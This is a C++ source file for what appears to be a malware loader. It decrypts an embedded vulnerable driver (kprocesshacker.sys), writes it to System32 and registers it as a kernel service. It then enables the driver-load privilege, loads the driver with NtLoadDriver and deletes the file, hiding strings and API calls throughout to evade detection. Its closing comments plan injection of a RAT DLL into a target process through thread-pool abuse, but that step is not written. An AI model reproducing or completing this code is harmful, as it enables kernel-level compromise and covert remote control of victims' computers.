#include <vector>
#include <windows.h>
#include <fstream>
#include "byte_encryption.h"
#include "resources.h"
#include "junk_codes.h"

// Prototypes

typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN Client,
    PBOOLEAN WasEnabled
);

typedef NTSTATUS (NTAPI *NtLoadDriver_t)(
    PUNICODE_STRING DriverServiceName
);

typedef void (NTAPI *RtlInitUnicodeString_t)(
    PUNICODE_STRING DestinationString,
    PCWSTR          SourceString
);
    
typedef decltype(RegCreateKeyA)* RegCreateKeyA_t;
typedef decltype(RegSetKeyValueA)* RegSetKeyValueA_t;
typedef decltype(RegCloseKey)* RegCloseKey_t;

static std::wstring to_wstring(const char*);

int main(int argc, char** argv)
{
	// Load the vulnerable driver: kprocesshacker.sys
    /*
    * Decrypt the driver from memory
    * Write the driver to disk (to System32)
    * Create the registry path
    * call NtLoadDriver()
    * - Possibly unload the driver after injecting
    */
    
    // Decrypt the driver path to write to disk
    std::string driverPath = decrypt_string(str_kphDriverPathOnDisk);
    std::ofstream driver_ofstream(driverPath.c_str(), std::ios::binary);
    wipeStr(driverPath);

    // Decrypt the driver from memory and write it to disk
    std::vector<uint8_t> kph_driver = decrypt_bytes(kprocesshacker_driver_encrypted);
    if (!driver_ofstream.write(reinterpret_cast<const char*>(kph_driver.data()), kph_driver.size()))
    {
#ifdef _DEBUG
        std::cerr << "Error: Could not write the vulnerable driver to disk." << std::endl;
#endif 
        driver_ofstream.close();
        return 1;
    }
    driver_ofstream.close();
    wipeBytes(kph_driver);
    
    // Create the driver service keys in the registry
    HKEY dservice;

    RegCreateKeyA_t RegCreateKeyA_ptr = resolve_dynamically<RegCreateKeyA_t>(str_RegCreateKeyA, str_advapi32);
    RegSetKeyValueA_t RegSetKeyValueA_ptr = resolve_dynamically<RegSetKeyValueA_t>(str_RegSetKeyValueA, str_advapi32);
    RegCloseKey_t RegCloseKey_ptr = resolve_dynamically<RegCloseKey_t>(str_RegCloseKey, str_advapi32);

    std::string servicesPath = decrypt_string(str_servicesPath);
    LSTATUS status = RegCreateKeyA_ptr(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice);
    wipeStr(servicesPath);
    if (status != ERROR_SUCCESS)
    {
#ifdef _DEBUG
        std::cerr << "Error: Could not create driver service key" << std::endl;
#endif 
        return 1;
    }

    std::string imagePath = decrypt_string(str_ImagePath);
    std::string driverNtPath = decrypt_string(str_kphDriverNtPath);
    status = RegSetKeyValueA_ptr(dservice, NULL, imagePath.c_str(), REG_EXPAND_SZ, driverNtPath.c_str(), (DWORD)(driverNtPath.size() + 1));
    wipeStr(driverPath);
    wipeStr(imagePath);
    if (status != ERROR_SUCCESS)
    {
#ifdef _DEBUG
        std::cerr << "Error: Could not create 'ImagePath' registry value" << std::endl;
#endif 
        return 1;
    }

    DWORD ServiceTypeKernel = 1;
    std::string type = decrypt_string(str_Type);
    status = RegSetKeyValueA_ptr(dservice, NULL, type.c_str(), REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
    wipeStr(type);
    if (status != ERROR_SUCCESS)
    {
#ifdef _DEBUG
        std::cerr << "Error: Could not create 'Type' registry value" << std::endl;
#endif 
        return 1;
    }

    RegCloseKey_ptr(dservice);

    // Enable SE_LOAD_DRIVER_PRIVILIGE via RtlAdjustPrivilige()
    RtlAdjustPrivilege_t RtlAdjustPrivilege_ptr = resolve_dynamically<RtlAdjustPrivilege_t>(str_RtlAdjustPrivilege, str_ntdll);
    ULONG SE_LOAD_DRIVER_PRIVILIGE = 10ul;
    BOOLEAN SeLoadDriverWasEnabled;

    NTSTATUS ntStatus = RtlAdjustPrivilege_ptr(SE_LOAD_DRIVER_PRIVILIGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
    if (!(ntStatus >= 0)) // if not success
    {
#ifdef _DEBUG
        std::cerr << "Fatal Error: Failed to accuire SE_LOAD_DRIVER_PRIVILEGE" << std::endl;
#endif 
        return 1;
    }
    
    // Prepare for NtLoadDriver() call
    NtLoadDriver_t NtLoadDriver_ptr = resolve_dynamically<NtLoadDriver_t>(str_NtLoadDriver, str_ntdll);
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = resolve_dynamically<RtlInitUnicodeString_t>(str_RtlInitUnicodeString, str_ntdll);
    UNICODE_STRING dserviceRegPathUnicodeString;
    std::string decryptedServiceRegPath = decrypt_string(str_serviceRegStr);

    std::wstring wideServiceRegPath = to_wstring(decryptedServiceRegPath.c_str());
    wipeStr(decryptedServiceRegPath);
    
    RtlInitUnicodeString_ptr(&dserviceRegPathUnicodeString, wideServiceRegPath.c_str());

    // Call NtLoadDriver()
    ntStatus = NtLoadDriver_ptr(&dserviceRegPathUnicodeString);

    // Do some cleaning
    SecureZeroMemory(&dserviceRegPathUnicodeString, sizeof(dserviceRegPathUnicodeString));
    SecureZeroMemory(&wideServiceRegPath[0], wideServiceRegPath.size() * sizeof(wchar_t));
    wideServiceRegPath.clear();

    if (ntStatus == 0xC0000603) // STATUS_IMAGE_CERT_REVOKED
    {   
#ifdef _DEBUG
        std::cerr << "Fatal Error: Couldn't load the driver because it has been blocked.\nError Code: 0x" << std::hex << ntStatus << "\nReason: STATUS_IMAGE_CERT_REVOKED" << std::endl;
#endif 
        return 1;
    }

    else if (ntStatus == 0xC0000022 || ntStatus == 0xC000009A) // STATUS_ACCESS_DENIED and STATUS_INSUFFICIENT_RESOURCES
    {
#ifdef _DEBUG
        std::cerr << "Fatal Error: Couldn't load the driver due to Access Denied or Insufficient Resources.\nError Code: 0x" << std::hex << ntStatus << std::endl;
#endif
        return 1;
    }

    else if (!(ntStatus >= 0)) // !NT_SUCCESS(ntStatus)
    {
#ifdef _DEBUG
        std::cerr << "Fatal Error: Couldn't load the driver due to unknown error code.\nError Code: 0x" << std::hex << ntStatus << std::endl;
#endif 
        return 1;
    }

    // Delete the driver file on disk
    driverPath = decrypt_string(str_kphDriverPathOnDisk);
    remove(driverPath.c_str());
    wipeStr(driverPath);


    // Inject the RAT dll to the target process's virtual memory (after applying relocations)
    

    // Execute the AddressOfEntryPoint of the dll in the target process via abusing Thread pools (PoolParty)
	return 0;
}

static std::wstring to_wstring(const char* narrowStr)
{
    size_t len = strlen(narrowStr) + 1;
    std::wstring wideStr(len, L'\0');
    mbstowcs_s(nullptr, &wideStr[0], len, narrowStr, len - 1); // Convert string
    wideStr.resize(len - 1); // Trim trailing null character

    return wideStr;
}